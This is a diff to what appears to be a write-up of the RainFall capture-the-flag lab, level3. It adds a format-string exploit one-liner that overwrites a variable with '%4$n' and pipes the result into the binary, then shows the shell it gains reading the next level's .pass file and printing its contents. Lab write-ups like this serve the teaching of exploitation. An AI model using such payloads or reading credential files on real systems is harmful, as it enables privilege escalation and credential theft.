@@ -75,4 +75,14 @@ AAAA %p %4$x
 AAAA 0x200 41414141
 ```
 
-
+```
+level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "A" * 60 + "%4$n"' ; cat ) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Wait what?!
+pwd
+/home/user/level3
+whoami
+level4
+cat //home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
